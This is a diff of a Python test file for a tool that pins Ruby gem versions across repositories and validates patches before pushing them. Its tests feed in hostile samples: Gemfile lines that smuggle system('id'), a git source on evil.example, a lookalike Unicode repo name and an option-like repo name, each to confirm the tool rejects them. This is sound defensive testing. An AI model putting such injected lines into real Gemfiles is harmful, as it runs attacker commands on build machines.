@@ -42,6 +42,7 @@ gem 'jekyll-timeago', '~> 0.13.1', require: false
 gem 'ffi', '= 1.16.3'
 """
 M = al.load_matrix(MATRIX_TEXT)
+ALLOWED = {"a/site", "brightsoftwares/corporate-website"}
 LATEST = {"ffi": "1.18.0", "jekyll-timeago": "1.2.0"}
 
 
@@ -88,13 +89,13 @@ def test_pin_gemfile_rewrites_constraint_and_appends_transitive():
 # ------------------------------------------------------------------ blocker 1: text validation of the patch
 def good_patch():
     gf = al.pin_gemfile(GEMFILE, {"ffi": "1.17.4", "jekyll-timeago": "1.1.0"})
-    return {"repo": "a/site", "branch": "main", "summary": "ffi 1.16.3->1.17.4", "ahead": "",
+    return {"repo": "a/site", "branch": "main", "summary": "ffi 1.16.3->1.17.4, jekyll-timeago 0.13.1->1.1.0", "ahead": "",
             "before_gemfile": GEMFILE, "before_lock": LOCK, "after_gemfile": gf,
             "after_lock": apply_update(LOCK, gf, ["ffi", "jekyll-timeago"])}
 
 
 def test_good_patch_validates():
-    assert al.patch_problems(good_patch(), M) == []
+    assert al.patch_problems(good_patch(), M, ALLOWED) == []
 
 
 @pytest.mark.parametrize("mutate,needle", [
@@ -112,7 +113,7 @@ def test_good_patch_validates():
 def test_patch_text_validation_refuses(mutate, needle):
     p = good_patch()
     mutate(p)
-    assert any(needle in x for x in al.patch_problems(p, M)), al.patch_problems(p, M)
+    assert any(needle in x for x in al.patch_problems(p, M, ALLOWED)), al.patch_problems(p, M, ALLOWED)
 
 
 def test_unallowlisted_existing_git_source_is_refused():
@@ -169,7 +170,7 @@ def test_build_env_is_an_allowlist(tmp_path, monkeypatch):
         assert set(env) == {"PATH", "LANG", "HOME", "TMPDIR", "BUNDLE_APP_CONFIG", "BUNDLE_USER_HOME"}
         assert env["HOME"] == env["TMPDIR"] and "AWS_SECRET_ACCESS_KEY" not in env
     assert r.calls[0][0] == ["bundle", "update", "ffi", "jekyll-timeago", "--conservative"]
-    assert al.patch_problems(patch, M) == []
+    assert al.patch_problems(patch, M, ALLOWED) == []
     with pytest.raises(ValueError):
         al.build_env("/tmp/x", passthrough=("GITHUB_TOKEN",))
 
@@ -247,7 +248,7 @@ class GitRunner:
 
 
 def push(tmp_path, runner, apply=True, **kw):
-    return al.push_patch(runner.patch, M, str(tmp_path), apply, TOKEN, runner=runner, trailer="T", **kw)
+    return al.push_patch(runner.patch, M, str(tmp_path), apply, TOKEN, runner=runner, trailer="T", allowed=ALLOWED, **kw)
 
 
 def test_push_hardening_hooks_config_scope_and_redirects(tmp_path):
@@ -271,11 +272,11 @@ def test_push_hardening_hooks_config_scope_and_redirects(tmp_path):
 
 def test_push_dry_run_validates_text_only_no_clone_no_token_needed(tmp_path):
     r = GitRunner()
-    out = al.push_patch(r.patch, M, str(tmp_path), False, "", runner=r)
+    out = al.push_patch(r.patch, M, str(tmp_path), False, "", runner=r, allowed=ALLOWED)
     assert "WOULD push" in out and r.calls == []
     bad = good_patch()
     bad["after_lock"] = bad["after_lock"].replace("https://rubygems.org/", "https://evil.example/")
-    assert "patch rejected" in al.push_patch(bad, M, str(tmp_path), True, TOKEN, runner=r) and r.calls == []
+    assert "patch rejected" in al.push_patch(bad, M, str(tmp_path), True, TOKEN, runner=r, allowed=ALLOWED) and r.calls == []
 
 
 def test_push_refuses_stale_patch_and_symlinked_lock_in_fresh_clone(tmp_path):
@@ -450,14 +451,102 @@ def test_main_push_rejects_a_patch_for_a_repo_not_in_the_fleet_list(tmp_path, ca
 def test_patch_summary_and_ahead_shape_is_validated(mutate):
     p = fleet_patch()
     mutate(p)
-    assert al.patch_problems(p, M) in (["malformed patch"], ["invalid summary in patch"], ["invalid ahead note in patch"])
+    assert al.patch_problems(p, M, ALLOWED) in (["malformed patch"], ["invalid summary in patch"], ["invalid ahead note in patch"])
 
 
 def test_patch_with_valid_ahead_note_and_multi_gem_summary_is_accepted():
     p = fleet_patch(summary="ffi 1.16.3->1.17.4, jekyll-timeago 0.13.1->1.1.0", ahead=al.AHEAD_PREFIX + "{'jekyll': '4.4.1'}")
-    assert al.patch_problems(p, M) == []
+    assert al.patch_problems(p, M, ALLOWED) == []
 
 
 def test_non_dict_patch_is_malformed_not_a_crash():
-    assert al.patch_problems(["x"], M) == ["malformed patch"]
-    assert al.safe_call("n", al.push_patch, ["x"], M, "/nonexistent", False, "").startswith("?: FAIL patch rejected")
+    assert al.patch_problems(["x"], M, ALLOWED) == ["malformed patch"]
+    assert al.safe_call("n", al.push_patch, ["x"], M, "/nonexistent", False, "", allowed=ALLOWED).startswith("?: FAIL patch rejected")
+
+
+# ------------------------------------------------------------------ regenerate, do not trust (Gemfile + summary)
+@pytest.mark.parametrize("extra", [
+    "gem 'ffi', '= 1.17.4'; system('id')\n",
+    "gem 'ffi', '= 1.17.4', git: 'https://evil.example/x.git'\n",
+    "gem 'jekyll-timeago', '= 1.1.0' # ok\nsystem('id')\n",
+])
+def test_gemfile_exploit_lines_that_pass_name_and_pin_checks_are_rejected(extra):
+    p = good_patch()
+    p["after_gemfile"] += extra
+    assert al.patch_problems(p, M, ALLOWED), "exploit Gemfile line accepted"
+
+
+def test_gemfile_must_be_byte_identical_to_the_regenerated_pin():
+    p = good_patch()
+    p["after_gemfile"] = p["after_gemfile"].replace("'= 1.17.4'", "'= 1.17.4' ")  # harmless-looking whitespace
+    assert any("regenerated pin" in x for x in al.patch_problems(p, M, ALLOWED))
+
+
+def test_summary_must_match_the_lock_diff_and_commit_uses_it():
+    p = good_patch()
+    p["summary"] = "ffi 1.16.3->1.17.4"  # well-formed but drops a gem the lock really changed
+    assert any("summary does not match" in x for x in al.patch_problems(p, M, ALLOWED))
+    p = good_patch()
+    p["after_lock"] = p["after_lock"].replace("    rexml (3.4.5)", "    rexml (3.4.6)")
+    assert any("lock changes" in x or "outside the matrix" in x for x in al.patch_problems(p, M, ALLOWED))
+
+
+# ------------------------------------------------------------------ ASCII-only names, required allowlist
+def test_unicode_lookalike_repo_names_are_rejected():
+    kelvin = "BrightSoftwares/\u212aelvin"  # KELVIN SIGN lower-cases to ASCII 'k'
+    assert not al.valid_repo(kelvin) and not al.valid_name("m\u00e4in")
+    with pytest.raises(ValueError):
+        al.parse_repo_list(kelvin)
+    p = good_patch()
+    p["repo"] = "a/s\u212aite"
+    assert al.patch_problems(p, M, {"a/site"}) == ["invalid repo or branch in patch"]
+
+
+def test_allowed_is_a_required_argument():
+    with pytest.raises(TypeError):
+        al.push_patch(good_patch(), M, "/nonexistent", False, "")
+    with pytest.raises(TypeError):
+        al.patch_problems(good_patch(), M)
+
+
+# ------------------------------------------------------------------ failure reporting
+def test_pushed_commit_without_a_pr_is_a_failure_not_done(tmp_path):
+    class NoPR:
+        def get(self, path):
+            return 200, []
+
+        def request(self, method, path, body=None):
+            return 403, {}, {}
+
+    msg = push(tmp_path, GitRunner(), gh=NoPR())
+    assert "FAIL" in msg and "PR creation failed" in msg and "DONE" not in msg and al.is_failure(msg)
+
+
+def test_fetch_phase_exit_code_and_unlisted_inaccessible_repo(tmp_path, capsys, monkeypatch):
+    monkeypatch.setenv("GITHUB_TOKEN", TOKEN)
+    repos = tmp_path / "repos.txt"
+    repos.write_text("a/gone\n")
+    monkeypatch.setattr(al.GitHub, "from_env", classmethod(lambda cls: object()))
+    monkeypatch.setattr(al, "default_branch", lambda gh, repo: None)
+    argv = ["--phase", "fetch", "--repos", str(repos), "--out", str(tmp_path / "w")]
+    assert al.main(argv) == 1
+    assert "a/gone: ERROR not accessible" in capsys.readouterr().out
+    monkeypatch.setattr(al, "default_branch", lambda gh, repo: "main")
+    monkeypatch.setattr(al, "fetch_repo", lambda *a, **k: "a/gone: fetched")
+    assert al.main(argv) == 0
+    monkeypatch.setattr(al, "fetch_repo", lambda *a, **k: "a/gone: ERROR clone failed")
+    assert al.main(argv) == 1
+
+
+def test_build_reports_invalid_or_unreadable_meta_json(tmp_path, capsys, monkeypatch):
+    for k in al.SECRET_ENV:
+        monkeypatch.delenv(k, raising=False)
+    indir = tmp_path / "in"
+    (indir / "nometa").mkdir(parents=True)
+    (indir / "badrepo").mkdir()
+    (indir / "badrepo" / "meta.json").write_text(json.dumps({"repo": "-evil/x", "branch": "main"}))
+    (indir / "badjson").mkdir()
+    (indir / "badjson" / "meta.json").write_text("{nope")
+    assert al.main(["--phase", "build", "--in", str(indir), "--patches", str(tmp_path / "p")]) == 1
+    out = capsys.readouterr().out
+    assert "nometa: ERROR" in out and "badrepo: ERROR" in out and "badjson: ERROR" in out
